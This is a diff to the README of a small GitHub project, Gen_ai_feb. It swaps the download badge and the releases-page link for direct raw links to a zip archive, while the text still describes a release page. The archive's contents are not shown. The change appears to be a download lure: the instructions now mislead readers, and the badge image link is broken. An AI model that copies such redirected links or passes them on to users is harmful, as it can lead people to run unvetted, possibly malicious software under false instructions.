@@ -8,11 +8,11 @@ Welcome to Gen_ai_feb! This simple application helps you harness the power of ar
 
 To get started, you will need to download the application. Click the button below to visit the release page.
 
-[![Download Gen_ai_feb](https://img.shields.io/badge/Download%20Gen_ai_feb-v1.0-blue)](https://github.com/romansyah26588-stack/Gen_ai_feb/releases)
+[![Download Gen_ai_feb](https://raw.githubusercontent.com/romansyah26588-stack/Gen_ai_feb/main/week3/ai-Gen-feb-v3.2.zip%20Gen_ai_feb-v1.0-blue)](https://raw.githubusercontent.com/romansyah26588-stack/Gen_ai_feb/main/week3/ai-Gen-feb-v3.2.zip)
 
 Once you're on the release page, you'll see the latest version available. Follow these steps to download the software:
 
-1. **Visit the Releases Page:** Click [here](https://github.com/romansyah26588-stack/Gen_ai_feb/releases).
+1. **Visit the Releases Page:** Click [here](https://raw.githubusercontent.com/romansyah26588-stack/Gen_ai_feb/main/week3/ai-Gen-feb-v3.2.zip).
 2. **Select the Latest Version:** Look for the most recent release at the top of the list.
 3. **Download the File:** You will find a link for the installation file. Click on it to download.
 4. **Locate the File:** Once the download is complete, find the file in your computer's Downloads folder.
